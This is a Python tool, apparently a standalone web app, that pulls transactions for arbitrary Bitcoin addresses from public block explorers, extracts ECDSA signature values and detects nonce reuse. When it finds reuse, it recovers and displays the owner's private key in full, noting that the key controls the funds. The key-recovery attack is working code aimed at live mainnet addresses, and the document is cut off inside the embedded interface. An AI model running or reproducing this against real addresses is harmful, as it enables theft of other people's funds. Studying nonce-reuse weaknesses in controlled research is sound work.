#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 Bitcoin ECDSA Signature Analysis Pipeline — Standalone Web Server
================================================================================

Zero dependencies.  Python 3.8+.  Runs with:

    python pipeline_server.py

Then open  http://localhost:8000  in your browser.

Features
  • Fetch spending transactions for Bitcoin addresses (Esplora API:
    mempool.space + blockstream.info with automatic fallback)
  • Parse raw Bitcoin transactions, extract ECDSA r / s / z values
    (legacy P2PKH / P2PK + SegWit v0 P2WPKH + P2SH-P2WPKH)
  • Convert r / s / z between hex / decimal / binary (toggle in UI)
  • Detect vulnerabilities:
      - Nonce reuse  →  FULL private key + nonce recovery
                       (k = (z1−z2)·(s1−s2)⁻¹ mod n
                        d = (s1·k − z1)·r⁻¹   mod n)
      - High-S malleability (BIP-62)
      - Weak / biased nonce (short r)
  • Polished dark-mode web UI — every value shown in FULL, no truncation
  • Also usable as a CLI:
        python pipeline_server.py --cli 1FvUkW8thcqG6HP7gAvAjcR52fR7CYodBx
        python pipeline_server.py --cli < addresses.txt

Educational / security-research use only.
================================================================================
"""

import sys
import os
import json
import hashlib
import struct
import time
import uuid
import argparse
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.request import urlopen, Request
from urllib.parse import urlparse
from urllib.error import URLError, HTTPError

# =============================================================================
#  secp256k1 constants
# =============================================================================
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
SECP256K1_HALF_N = SECP256K1_N // 2

# =============================================================================
#  Modular arithmetic (Python ints are arbitrary precision — no BigInt needed)
# =============================================================================
def mod(a, m=SECP256K1_N):
    return ((a % m) + m) % m

def modinv(a, m=SECP256K1_N):
    """Extended Euclidean algorithm — modular inverse of a mod m."""
    old_r, r = mod(a, m), m
    old_s, s = 1, 0
    while r != 0:
        q = old_r // r
        old_r, r = r, old_r - q * r
        old_s, s = s, old_s - q * s
    return mod(old_s, m)

# =============================================================================
#  Byte / hex helpers
# =============================================================================
def double_sha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def encode_varint(n: int) -> bytes:
    if n < 0xfd:
        return bytes([n])
    elif n <= 0xffff:
        return b'\xfd' + struct.pack('<H', n)
    elif n <= 0xffffffff:
        return b'\xfe' + struct.pack('<I', n)
    else:
        return b'\xff' + struct.pack('<Q', n)

def decode_varint(data: bytes, pos: int):
    if pos >= len(data):
        raise ValueError("Unexpected end of data at varint")
    b = data[pos]
    if b < 0xfd:
        return b, pos + 1
    elif b == 0xfd:
        return struct.unpack('<H', data[pos+1:pos+3])[0], pos + 3
    elif b == 0xfe:
        return struct.unpack('<I', data[pos+1:pos+5])[0], pos + 5
    else:
        return struct.unpack('<Q', data[pos+1:pos+9])[0], pos + 9

def hex_to_int(h: str) -> int:
    """Hex string (with or without 0x) → int. Handles arbitrary length."""
    s = h.strip()
    if s.startswith('0x') or s.startswith('0X'):
        s = s[2:]
    if not s:
        return 0
    return int(s, 16)

def int_to_hex(n: int, pad_to: int = 0) -> str:
    """int → hex string (no 0x prefix). pad_to = target char count (0 = no pad)."""
    h = format(n, 'x')
    if len(h) % 2 != 0:
        h = '0' + h
    if pad_to > 0:
        h = h.rjust(pad_to, '0')
    return h

def int_to_bin(n: int) -> str:
    """int → binary string grouped into bytes (e.g. '00011010 00101011')."""
    if n == 0:
        return '00000000'
    bits = format(n, 'b')
    pad = (8 - len(bits) % 8) % 8
    bits = '0' * pad + bits
    return ' '.join(bits[i:i+8] for i in range(0, len(bits), 8))

def format_value(hex_val: str, base: str) -> str:
    """Convert a hex value to the requested base for display."""
    if not hex_val or hex_val == '00' * 32:
        if base == 'hex':
            return hex_val or ''
        return '0'
    n = hex_to_int(hex_val)
    if base == 'hex':
        return hex_val
    elif base == 'dec':
        return str(n)
    elif base == 'bin':
        return int_to_bin(n)
    return hex_val

# =============================================================================
#  Raw transaction parsing
# =============================================================================
def parse_raw_transaction(rawtx_hex: str) -> dict:
    data = bytes.fromhex(rawtx_hex.strip())
    pos = 0
    if len(data) < 10:
        raise ValueError(f"Transaction too short: {len(data)} bytes")

    version = struct.unpack('<I', data[pos:pos+4])[0]; pos += 4

    marker = data[pos] if pos < len(data) else 0
    flag = data[pos+1] if pos+1 < len(data) else 0
    is_segwit = (marker == 0x00 and flag == 0x01)
    if is_segwit:
        pos += 2

    input_count, pos = decode_varint(data, pos)
    inputs = []
    for _ in range(input_count):
        prev_txid = data[pos:pos+32][::-1].hex(); pos += 32
        prevout = struct.unpack('<I', data[pos:pos+4])[0]; pos += 4
        script_len, pos = decode_varint(data, pos)
        script_sig = data[pos:pos+script_len]; pos += script_len
        sequence = struct.unpack('<I', data[pos:pos+4])[0]; pos += 4
        inputs.append({'prev_txid': prev_txid, 'prevout': prevout,
                       'script_sig': script_sig, 'sequence': sequence})

    output_count, pos = decode_varint(data, pos)
    outputs = []
    for _ in range(output_count):
        value = struct.unpack('<Q', data[pos:pos+8])[0]; pos += 8
        script_len, pos = decode_varint(data, pos)
        script_pubkey = data[pos:pos+script_len]; pos += script_len
        outputs.append({'value': value, 'script_pubkey': script_pubkey})

    witnesses = []
    if is_segwit:
        for _ in range(input_count):
            wcount, pos = decode_varint(data, pos)
            witness = []
            for _ in range(wcount):
                wlen, pos = decode_varint(data, pos)
                witness.append(data[pos:pos+wlen]); pos += wlen
            witnesses.append(witness)

    locktime = struct.unpack('<I', data[pos:pos+4])[0]
    return {'version': version, 'inputs': inputs, 'outputs': outputs,
            'witnesses': witnesses, 'locktime': locktime, 'is_segwit': is_segwit}

# =============================================================================
#  Script / signature parsing
# =============================================================================
def parse_der_signature(der_sig: bytes):
    """Extract (r, s) integers from DER-encoded signature (no sighash byte)."""
    if len(der_sig) < 8 or der_sig[0] != 0x30:
        raise ValueError("Invalid DER")
    pos = 2
    if der_sig[pos] != 0x02:
        raise ValueError("Invalid DER: r tag")
    r_len = der_sig[pos+1]
    r_bytes = der_sig[pos+2:pos+2+r_len]
    pos += 2 + r_len
    if pos >= len(der_sig) or der_sig[pos] != 0x02:
        raise ValueError("Invalid DER: s tag")
    s_len = der_sig[pos+1]
    s_bytes = der_sig[pos+2:pos+2+s_len]
    r = int.from_bytes(r_bytes, 'big')
    s = int.from_bytes(s_bytes, 'big')
    return r, s

def parse_script_sig(script_sig: bytes):
    """Parse legacy scriptSig → (der_sig, pubkey, sighash_type)."""
    pos = 0
    sig_len, pos = decode_varint(script_sig, pos)
    sig_with_hashtype = script_sig[pos:pos+sig_len]
    pos += sig_len
    if len(sig_with_hashtype) < 2:
        raise ValueError("Signature push too short")
    sighash_type = sig_with_hashtype[-1]
    der_sig = sig_with_hashtype[:-1]
    pubkey = None
    if pos < len(script_sig):
        try:
            pk_len, pk_pos = decode_varint(script_sig, pos)
            candidate = script_sig[pk_pos:pk_pos+pk_len]
            if (len(candidate) == 33 and candidate[0] in (0x02, 0x03)) or \
               (len(candidate) == 65 and candidate[0] == 0x04):
                pubkey = candidate
        except Exception:
            pass
    return der_sig, pubkey, sighash_type

def parse_witness_signature(witness: list):
    """Parse P2WPKH witness [sig+sighash, pubkey] → (der_sig, pubkey, sighash_type)."""
    if len(witness) < 2:
        raise ValueError("P2WPKH witness needs >=2 items")
    sig_with_hashtype = witness[0]
    pubkey = witness[1]
    if len(sig_with_hashtype) < 2:
        raise ValueError("Witness signature too short")
    sighash_type = sig_with_hashtype[-1]
    der_sig = sig_with_hashtype[:-1]
    return der_sig, pubkey, sighash_type

# =============================================================================
#  Script-type detection
# =============================================================================
def is_p2pkh(spk: bytes) -> bool:
    return (len(spk) == 25 and spk[0] == 0x76 and spk[1] == 0xa9 and spk[2] == 0x14
            and spk[23] == 0x88 and spk[24] == 0xac)

def is_p2pk(spk: bytes) -> bool:
    if len(spk) == 35 and spk[0] == 33 and spk[1] in (2, 3) and spk[34] == 0xac:
        return True
    if len(spk) == 67 and spk[0] == 65 and spk[1] == 4 and spk[66] == 0xac:
        return True
    return False

def is_p2wpkh(spk: bytes) -> bool:
    return len(spk) == 22 and spk[0] == 0x00 and spk[1] == 0x14

def is_p2sh(spk: bytes) -> bool:
    return len(spk) == 23 and spk[0] == 0xa9 and spk[1] == 0x14 and spk[22] == 0x87

def is_p2wsh(spk: bytes) -> bool:
    return len(spk) == 34 and spk[0] == 0x00 and spk[1] == 0x20

def is_p2tr(spk: bytes) -> bool:
    return len(spk) == 34 and spk[0] == 0x51 and spk[1] == 0x20

def p2pkh_from_hash160(hash160: bytes) -> bytes:
    return bytes([0x76, 0xa9, 0x14]) + hash160 + bytes([0x88, 0xac])

# =============================================================================
#  Sighash (z) computation
# =============================================================================
def calculate_sighash_legacy(rawtx_hex: str, input_index: int,
                             script_pubkey: bytes, sighash_type: int = 0x01) -> bytes:
    data = bytes.fromhex(rawtx_hex)
    pos = 0
    version = data[pos:pos+4]; pos += 4
    is_segwit = (data[pos] == 0x00 and data[pos+1] == 0x01)
    if is_segwit:
        pos += 2
    input_count, pos = decode_varint(data, pos)
    preimage = bytearray()
    preimage.extend(version)
    preimage.extend(encode_varint(input_count))
    for i in range(input_count):
        prev_txid = data[pos:pos+32]; pos += 32
        prevout = data[pos:pos+4]; pos += 4
        script_len, pos = decode_varint(data, pos)
        pos += script_len
        sequence = data[pos:pos+4]; pos += 4
        preimage.extend(prev_txid)
        preimage.extend(prevout)
        if i == input_index:
            preimage.extend(encode_varint(len(script_pubkey)))
            preimage.extend(script_pubkey)
        else:
            preimage.extend(b'\x00')
        preimage.extend(sequence)
    output_count, pos = decode_varint(data, pos)
    preimage.extend(encode_varint(output_count))
    for _ in range(output_count):
        value = data[pos:pos+8]; pos += 8
        script_len, pos = decode_varint(data, pos)
        spk = data[pos:pos+script_len]; pos += script_len
        preimage.extend(value)
        preimage.extend(encode_varint(script_len))
        preimage.extend(spk)
    locktime = data[pos:pos+4]
    preimage.extend(locktime)
    preimage.extend(struct.pack('<I', sighash_type))
    return double_sha256(bytes(preimage))

def calculate_sighash_segwit_v0(rawtx_hex: str, input_index: int,
                                 prevout_value: int, script_pubkey_hex: str,
                                 sighash_type: int = 0x01) -> bytes:
    data = bytes.fromhex(rawtx_hex)
    pos = 0
    version = data[pos:pos+4]; pos += 4
    pos += 2  # skip segwit marker/flag
    input_count, pos = decode_varint(data, pos)
    inputs = []
    for _ in range(input_count):
        prev_txid = data[pos:pos+32]; pos += 32
        prevout = data[pos:pos+4]; pos += 4
        script_len, pos = decode_varint(data, pos)
        pos += script_len
        sequence = data[pos:pos+4]; pos += 4
        inputs.append((prev_txid, prevout, sequence))
    output_count, pos = decode_varint(data, pos)
    outputs = []
    for _ in range(output_count):
        value = data[pos:pos+8]; pos += 8
        script_len, pos = decode_varint(data, pos)
        spk = data[pos:pos+script_len]; pos += script_len
        outputs.append((value, spk))
    locktime = data[pos:pos+4]

    spk = bytes.fromhex(script_pubkey_hex) if isinstance(script_pubkey_hex, str) else script_pubkey_hex
    if len(spk) == 22 and spk[0] == 0x00 and spk[1] == 0x14:
        hash160 = spk[2:]
        script_code = bytes([0x76, 0xa9, 0x14]) + hash160 + bytes([0x88, 0xac])
    else:
        raise ValueError(f"Unsupported SegWit scriptPubKey: {spk.hex()}")

    preimage = bytearray()
    preimage.extend(version)
    prevouts_data = bytearray()
    for prev_txid, prevout, _ in inputs:
        prevouts_data.extend(prev_txid)
        prevouts_data.extend(prevout)
    preimage.extend(double_sha256(bytes(prevouts_data)))
    seq_data = bytearray()
    for _, _, seq in inputs:
        seq_data.extend(seq)
    preimage.extend(double_sha256(bytes(seq_data)))
    prev_txid, prevout, sequence = inputs[input_index]
    preimage.extend(prev_txid)
    preimage.extend(prevout)
    preimage.extend(encode_varint(len(script_code)))
    preimage.extend(script_code)
    preimage.extend(struct.pack('<Q', int(prevout_value)))
    preimage.extend(sequence)
    out_data = bytearray()
    for value, spk_out in outputs:
        out_data.extend(value)
        out_data.extend(encode_varint(len(spk_out)))
        out_data.extend(spk_out)
    preimage.extend(double_sha256(bytes(out_data)))
    preimage.extend(locktime)
    preimage.extend(struct.pack('<I', sighash_type))
    return double_sha256(bytes(preimage))

# =============================================================================
#  Signature extraction (per input of a spending transaction)
# =============================================================================
def extract_signatures(rawtx_hex: str, tx_json: dict, address: str) -> list:
    """Extract all ECDSA signatures from a spending transaction."""
    tx = parse_raw_transaction(rawtx_hex)
    vins = tx_json.get('vin', [])
    signatures = []

    for idx, inp in enumerate(tx['inputs']):
        if idx >= len(vins):
            continue
        vin = vins[idx]
        prevout = vin.get('prevout') or {}
        spk_hex = prevout.get('scriptpubkey', '')
        spk_addr = prevout.get('scriptpubkey_address', '')
        value = prevout.get('value')

        # Only process inputs that spend from our target address
        if spk_addr and spk_addr != address:
            continue

        if not spk_hex:
            continue

        spk = bytes.fromhex(spk_hex)
        if is_p2tr(spk):
            continue  # Taproot = Schnorr, not ECDSA

        is_segwit_input = (tx['is_segwit'] and tx.get('witnesses')
                           and idx < len(tx['witnesses']) and tx['witnesses'][idx])

        # Determine script type + extract der_sig, pubkey, sighash_type
        der_sig = None
        pubkey = None
        shtype = None
        script_type = 'unknown'

        try:
            if is_p2wpkh(spk) and is_segwit_input:
                der_sig, pubkey, shtype = parse_witness_signature(tx['witnesses'][idx])
                script_type = 'P2WPKH'
            elif is_p2sh(spk) and is_segwit_input:
                # P2SH-P2WPKH: witness has [sig, pubkey], scriptSig has redeem script
                redeem = None
                ss = inp['script_sig']
                if ss:
                    p = 0
                    sl, p = decode_varint(ss, p)
                    p += sl
                    rl, p = decode_varint(ss, p)
                    redeem = ss[p:p+rl]
                if redeem and len(redeem) == 22 and redeem[0] == 0x00 and redeem[1] == 0x14:
                    der_sig, pubkey, shtype = parse_witness_signature(tx['witnesses'][idx])
                    script_type = 'P2SH-P2WPKH'
                    spk = redeem  # use redeem script for sighash
                else:
                    continue
            elif is_p2pkh(spk):
                if not inp['script_sig']:
                    continue
                der_sig, pubkey, shtype = parse_script_sig(inp['script_sig'])
                script_type = 'P2PKH'
            elif is_p2pk(spk):
                if not inp['script_sig']:
                    continue
                der_sig, pubkey, shtype = parse_script_sig(inp['script_sig'])
                script_type = 'P2PK'
                # For P2PK, pubkey is in the prevout script, not scriptSig
                pk = spk[1:-1]
                if len(pk) in (33, 65):
                    pubkey = pk
            else:
                continue
        except Exception:
            continue

        if der_sig is None or shtype is None:
            continue

        try:
            r, s = parse_der_signature(der_sig)
        except Exception:
            continue

        # Compute sighash z
        z_bytes = b'\x00' * 32
        try:
            if is_segwit_input and value is not None:
                z_bytes = calculate_sighash_segwit_v0(rawtx_hex, idx, value, spk.hex(), shtype)
            else:
                z_bytes = calculate_sighash_legacy(rawtx_hex, idx, spk, shtype)
        except Exception:
            pass

        sig = {
            'id': f"{tx_json['txid']}:{idx}:0",
            'address': address,
            'txid': tx_json['txid'],
            'input_index': idx,
            'prev_txid': inp['prev_txid'],
            'prevout': inp['prevout'],
            'sequence': inp['sequence'],
            'type': script_type,
            'der_signature': der_sig.hex(),
            'r': int_to_hex(r),
            's': int_to_hex(s),
            'low_s': s <= SECP256K1_HALF_N,
            'z': z_bytes.hex(),
            'sighash_type': shtype,
            'pubkey': pubkey.hex() if pubkey else '(none)',
            'block_height': tx_json.get('status', {}).get('block_height'),
            'block_time': tx_json.get('status', {}).get('block_time'),
            'value_sats': str(value) if value is not None else None,
            'bit_length_r': r.bit_length(),
        }
        signatures.append(sig)

    return signatures

# =============================================================================
#  Esplora blockchain API client
# =============================================================================
ESPLORA_HOSTS = [
    {'name': 'mempool.space',     'base': 'https://mempool.space/api'},
    {'name': 'blockstream.info',  'base': 'https://blockstream.info/api'},
]

PAGE_DELAY = 0.25
ADDR_DELAY = 0.4
TIMEOUT = 30
MAX_PAGES = 40

def _http_get(url: str, timeout: int = TIMEOUT) -> str:
    req = Request(url, headers={
        'User-Agent': 'ECDSA-Pipeline/1.0',
        'Accept': 'application/json, text/plain',
    })
    with urlopen(req, timeout=timeout) as resp:
        return resp.read().decode('utf-8')

def _pick_host() -> str:
    """Race the hosts, return the base URL of the first that responds."""
    import concurrent.futures
    def check(host):
        _http_get(f"{host['base']}/blocks/tip/height", timeout=5)
        return host
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(ESPLORA_HOSTS)) as ex:
        futs = {ex.submit(check, h): h for h in ESPLORA_HOSTS}
        for fut in concurrent.futures.as_completed(futs, timeout=8):
            try:
                return fut.result()['base']
            except Exception:
                continue
    return ESPLORA_HOSTS[0]['base']

def fetch_address_txs(address: str, host_base: str, on_progress=None) -> list:
    """Fetch all transactions for an address (paginated)."""
    def _log(msg):
        if on_progress:
            on_progress(msg)

    first_url = f"{host_base}/address/{address}/txs"
    _log(f"  Fetching transaction history from {first_url}…")
    first_json = json.loads(_http_get(first_url))
    if not isinstance(first_json, list):
        raise ValueError("Unexpected address history response")

    all_txs = list(first_json)
    _log(f"  Initial page: {len(all_txs)} transactions")

    last_confirmed = None
    for tx in reversed(all_txs):
        if tx.get('status', {}).get('confirmed'):
            last_confirmed = tx['txid']
            break

    pages = 0
    while last_confirmed and pages < MAX_PAGES:
        pages += 1
        chain_url = f"{host_base}/address/{address}/txs/chain/{last_confirmed}"
        page = json.loads(_http_get(chain_url))
        if not page:
            break
        all_txs.extend(page)
        _log(f"  Chain page {pages}: {len(page)} transactions")
        if len(page) < 25:
            break
        last_confirmed = page[-1]['txid']
        time.sleep(PAGE_DELAY)

    # Dedupe
    seen = set()
    unique = []
    for tx in all_txs:
        if tx['txid'] not in seen:
            seen.add(tx['txid'])
            unique.append(tx)
    return unique

def get_raw_tx(txid: str, host_base: str) -> str:
    return _http_get(f"{host_base}/tx/{txid}/hex").strip()

def is_spending_transaction(tx: dict, address: str) -> bool:
    for vin in tx.get('vin', []):
        po = vin.get('prevout') or {}
        if po.get('scriptpubkey_address') == address:
            return True
    return False

def scan_one_address(address: str, host_base: str, on_progress=None) -> list:
    """Fetch + parse all spending txs for one address → list of Signature dicts."""
    def _log(msg):
        if on_progress:
            on_progress(msg)

    txs = fetch_address_txs(address, host_base, on_progress)
    spending = [t for t in txs if is_spending_transaction(t, address)]
    _log(f"  Found {len(spending)} spending transaction(s) out of {len(txs)} total")

    signatures = []
    for i, tx in enumerate(spending):
        txid = tx['txid']
        _log(f"  [{i+1}/{len(spending)}] Parsing {txid}…")
        try:
            raw_hex = get_raw_tx(txid, host_base)
            sigs = extract_signatures(raw_hex, tx, address)
            signatures.extend(sigs)
            _log(f"    → {len(sigs)} signature(s) extracted")
        except Exception as e:
            _log(f"    ✗ Failed: {e}")
    return signatures

# =============================================================================
#  Vulnerability detection + private key recovery
# =============================================================================
def recover_key_from_reuse(sig1: dict, sig2: dict):
    """Recover private key d and nonce k from two signatures sharing r."""
    r = hex_to_int(sig1['r'])
    s1 = hex_to_int(sig1['s'])
    s2 = hex_to_int(sig2['s'])
    z1 = hex_to_int(sig1['z'])
    z2 = hex_to_int(sig2['z'])

    if r == 0 or s1 == s2:
        return None

    s_diff = mod(s1 - s2)
    if s_diff == 0:
        return None

    # k = (z1 − z2) · (s1 − s2)⁻¹  mod n
    k = mod(mod(z1 - z2) * modinv(s_diff))

    # d = (s1·k − z1) · r⁻¹  mod n
    r_inv = modinv(r)
    if r_inv == 0:
        return None
    d = mod(mod(s1 * k - z1) * r_inv)

    if d == 0 or k == 0:
        return None

    return {'private_key': int_to_hex(d, 64), 'nonce': int_to_hex(k, 64)}

def detect_vulnerabilities(signatures: list) -> list:
    vulns = []

    # 1) Nonce reuse — group by r
    groups = {}
    for sig in signatures:
        r_key = sig['r'].lstrip('0') or '0'
        groups.setdefault(r_key, []).append(sig)

    for r_key, group in groups.items():
        if len(group) < 2:
            continue
        same_everything = all(
            s['s'] == group[0]['s'] and s['z'] == group[0]['z'] and s['pubkey'] == group[0]['pubkey']
            for s in group
        )
        if same_everything:
            vulns.append({
                'id': f"dup-{r_key[:16]}",
                'type': 'weak_nonce',
                'severity': 'low',
                'title': 'Duplicate signature record',
                'description': (f"The exact same r, s, and z appear {len(group)} times. "
                                f"This is a repeated record, not a fresh nonce. "
                                f"r = {group[0]['r']}"),
                'address': group[0]['address'],
                'signatures': group,
            })
            continue

        # Genuine nonce reuse — attempt key recovery
        recovered = None
        for i in range(len(group)):
            for j in range(i + 1, len(group)):
                a, b = group[i], group[j]
                if a['s'] == b['s'] and a['z'] == b['z']:
                    continue
                recovered = recover_key_from_reuse(a, b)
                if recovered:
                    break
            if recovered:
                break

        addresses = list(dict.fromkeys(s['address'] for s in group))
        pubkeys = list(dict.fromkeys(s['pubkey'] for s in group if s['pubkey']))

        if recovered:
            vulns.append({
                'id': f"reuse-{r_key[:16]}",
                'type': 'nonce_reuse',
                'severity': 'critical',
                'title': 'Nonce reuse — private key recovered',
                'description': (f"{len(group)} signature(s) share the same r value "
                                f"(r = {r_key.rjust(64, '0')}). On secp256k1 a repeated r "
                                f"means the nonce k collided, allowing private key recovery via "
                                f"modular arithmetic. Affected address(es): {', '.join(addresses)}. "
                                f"The recovered private key below controls all funds locked by this key."),
                'address': addresses[0],
                'signatures': group,
                'recovered_private_key': recovered['private_key'],
                'recovered_nonce': recovered['nonce'],
            })
        else:
            vulns.append({
                'id': f"reuse-{r_key[:16]}",
                'type': 'nonce_reuse',
                'severity': 'critical',
                'title': 'Nonce reuse detected (key recovery inconclusive)',
                'description': (f"{len(group)} signature(s) share r = {r_key.rjust(64, '0')}. "
                                f"Nonce reuse is present but automatic recovery did not succeed "
                                f"on the available pair(s). Address(es): {', '.join(addresses)}."),
                'address': addresses[0],
                'signatures': group,
            })

    # 2) High-S malleability — group by address
    high_s = [s for s in signatures if not s['low_s']]
    if high_s:
        by_addr = {}
        for s in high_s:
            by_addr.setdefault(s['address'], []).append(s)
        for addr, group in by_addr.items():
            vulns.append({
                'id': f"highs-{addr[:16]}",
                'type': 'high_s',
                'severity': 'medium',
                'title': f'High-S signatures for {addr}',
                'description': (f"{len(group)} signature(s) from {addr} use s > n/2 (high-S form). "
                                f"BIP-62 low-S policy rejects these; they are malleable. "
                                f"This is NOT a private-key leak."),
                'address': addr,
                'signatures': group,
            })

    # 3) Weak nonce — very small r (≤128 bits) or short r (129–160 bits)
    very_small = [s for s in signatures if s.get('bit_length_r', 0) <= 128]
    medium_small = [s for s in signatures if 128 < s.get('bit_length_r', 0) <= 160]
    if very_small:
        vulns.append({
            'id': 'tiny-r',
            'type': 'weak_nonce',
            'severity': 'low',
            'title': 'Very small r (possible biased nonce)',
            'description': (f"{len(very_small)} signature(s) have an r value of 128 bits or fewer. "
                            f"A uniformly random nonce almost never produces an r that small — "
                            f"this may indicate a biased RNG vulnerable to lattice attacks."),
            'signatures': very_small,
        })
    if medium_small:
        vulns.append({
            'id': 'short-r',
            'type': 'weak_nonce',
            'severity': 'low',
            'title': 'Short r (potential nonce bias)',
            'description': (f"{len(medium_small)} signature(s) have an r of 129–160 bits. "
                            f"Cluster of short r values may indicate a mildly biased nonce generator."),
            'signatures': medium_small,
        })

    # Sort: critical first
    sev_order = {'critical': 0, 'medium': 1, 'low': 2}
    vulns.sort(key=lambda v: sev_order.get(v['severity'], 3))
    return vulns

# =============================================================================
#  Pipeline orchestrator
# =============================================================================
def run_pipeline(addresses: list, on_progress=None) -> dict:
    """Run the full pipeline: fetch → parse → detect. Returns complete results."""
    def _log(msg, current=None, total=None):
        if on_progress:
            on_progress(msg, current, total)

    _log(f"Starting pipeline for {len(addresses)} address(es)…")
    host_base = _pick_host()
    _log(f"Using chain index: {host_base}")

    all_signatures = []
    for i, addr in enumerate(addresses):
        _log(f"[{i+1}/{len(addresses)}] Scanning {addr}…", i, len(addresses))
        try:
            sigs = scan_one_address(addr, host_base, on_progress=lambda m: _log(f"  {m}"))
            all_signatures.extend(sigs)
            _log(f"[{i+1}/{len(addresses)}] {addr}: {len(sigs)} signature(s) extracted", i+1, len(addresses))
        except Exception as e:
            _log(f"[{i+1}/{len(addresses)}] {addr}: FAILED — {e}", i+1, len(addresses))
        if i < len(addresses) - 1:
            time.sleep(ADDR_DELAY)

    _log(f"Detecting vulnerabilities across {len(all_signatures)} signature(s)…")
    vulns = detect_vulnerabilities(all_signatures)

    summary = {
        'addresses': len(addresses),
        'signatures': len(all_signatures),
        'vulnerabilities': len(vulns),
        'nonce_reuse_count': sum(1 for v in vulns if v['type'] == 'nonce_reuse'),
        'high_s_count': sum(1 for v in vulns if v['type'] == 'high_s'),
        'weak_nonce_count': sum(1 for v in vulns if v['type'] == 'weak_nonce'),
        'keys_recovered': sum(1 for v in vulns if v.get('recovered_private_key')),
    }
    _log(f"Pipeline complete: {summary['signatures']} sigs, {summary['vulnerabilities']} vulns, "
         f"{summary['keys_recovered']} key(s) recovered.")

    return {'signatures': all_signatures, 'vulnerabilities': vulns, 'summary': summary}

# =============================================================================
#  Address parsing
# =============================================================================
def parse_addresses(text: str) -> list:
    """Parse a textarea blob into unique, valid Bitcoin addresses."""
    import re
    # Split on whitespace, commas, semicolons, newlines
    tokens = re.split(r'[\s,;]+', text.strip())
    out = []
    seen = set()
    for tok in tokens:
        a = tok.strip()
        if not a:
            continue
        # Normalize bech32 to lowercase
        if a.lower().startswith(('bc1', 'tb1')):
            a = a.lower()
        if a in seen:
            continue
        # Plausibility check
        if (a.startswith(('1', '3')) and 25 <= len(a) <= 34) or \
           a.lower().startswith(('bc1', 'tb1')):
            seen.add(a)
            out.append(a)
    return out

# =============================================================================
#  HTML UI (embedded — no external files)
# =============================================================================
HTML_UI = r"""<!DOCTYPE html>
<html lang="en" class="dark">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bitcoin ECDSA Signature Analyzer</title>
<style>
  :root { --bg:#0a0a0a; --card:#161618; --border:#2a2a2e; --fg:#e4e4e7; --muted:#71717a;
          --accent:#f7931a; --emerald:#10b981; --red:#ef4444; --orange:#f97316; --violet:#8b5cf6; }
  * { box-sizing:border-box; margin:0; padding:0; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         background:var(--bg); color:var(--fg); line-height:1.5; min-height:100vh; display:flex; flex-direction:column; }
  .mono { font-family: 'SF Mono', Monaco, Consolas, monospace; }
  .break-all { word-break:break-all; }
  header { border-bottom:1px solid var(--border); padding:1rem 1.5rem; position:sticky; top:0; background:var(--bg); z-index:50; }
  header h1 { font-size:1.25rem; display:flex; align-items:center; gap:.5rem; }
  header h1 .icon { color:var(--accent); }
  header .sub { font-size:.8rem; color:var(--muted); margin-top:.25rem; }
  main { flex:1; max-width:1400px; width:100%; margin:0 auto; padding:1.5rem; display:flex; flex-direction:column; gap:1.5rem; }
  .grid { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; }
  @media(max-width:900px){ .grid{ grid-template-columns:1fr; } }
  .card { background:var(--card); border:1px solid var(--border); border-radius:.75rem; padding:1.5rem; }
  .card h2 { font-size:1rem; margin-bottom:1rem; color:var(--muted); text-transform:uppercase; letter-spacing:.05em; }
  textarea { width:100%; min-height:100px; background:#0d0d0d; border:1px solid var(--border); border-radius:.5rem;
             padding:.75rem; color:var(--fg); font-family:monospace; font-size:.85rem; resize:vertical; }
  textarea:focus { outline:none; border-color:var(--accent); }
  .controls { display:flex; gap:.75rem; align-items:center; margin-top:1rem; flex-wrap:wrap; }
  button { cursor:pointer; border:none; border-radius:.5rem; padding:.6rem 1.25rem; font-size:.875rem; font-weight:500; transition:.15s; }
  .btn-run { background:var(--emerald); color:#fff; }
  .btn-run:hover { background:#0d9668; }
  .btn-run:disabled { opacity:.4; cursor:not-allowed; }
  .btn-cancel { background:var(--red); color:#fff; }
  .btn-ghost { background:transparent; border:1px solid var(--border); color:var(--fg); }
  .btn-ghost:hover { border-color:var(--muted); }
  .progress { margin-top:1rem; }
  .progress-bar { height:6px; background:var(--border); border-radius:3px; overflow:hidden; }
  .progress-fill { height:100%; background:var(--emerald); transition:width .3s; }
  .progress-text { font-size:.8rem; color:var(--muted); margin-top:.5rem; }
  .log { max-height:320px; overflow-y:auto; background:#0d0d0d; border:1px solid var(--border); border-radius:.5rem; padding:.75rem; }
  .log-entry { font-family:monospace; font-size:.75rem; padding:.15rem 0; color:var(--muted); }
  .log-entry .ts { color:#525252; }
  .log-entry .phase { color:var(--violet); font-weight:600; }
  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:1rem; }
  .stat { background:var(--card); border:1px solid var(--border); border-radius:.75rem; padding:1.25rem; text-align:center; }
  .stat .num { font-size:2rem; font-weight:700; }
  .stat .lbl { font-size:.75rem; color:var(--muted); text-transform:uppercase; letter-spacing:.05em; margin-top:.25rem; }
  .stat.critical .num { color:var(--red); }
  .stat.recovered .num { color:var(--emerald); }
  .tabs { display:flex; gap:0; border-bottom:1px solid var(--border); margin-bottom:1.5rem; }
  .tab { padding:.75rem 1.25rem; cursor:pointer; border:none; background:none; color:var(--muted); font-size:.875rem; border-bottom:2px solid transparent; }
  .tab.active { color:var(--fg); border-bottom-color:var(--accent); }
  .tab .badge { background:var(--border); border-radius:10px; padding:.1rem .5rem; font-size:.7rem; margin-left:.25rem; }
  table { width:100%; border-collapse:collapse; font-size:.75rem; }
  th { text-align:left; padding:.5rem; border-bottom:1px solid var(--border); color:var(--muted); font-weight:600; position:sticky; top:0; background:var(--card); }
  td { padding:.5rem; border-bottom:1px solid var(--border); vertical-align:top; }
  .table-wrap { max-height:600px; overflow:auto; border:1px solid var(--border); border-radius:.5rem; }
  .toggle-group { display:inline-flex; border:1px solid var(--border); border-radius:.5rem; overflow:hidden; }
  .toggle-group button { background:transparent; border:none; padding:.4rem .8rem; font-size:.75rem; color:var(--muted); }
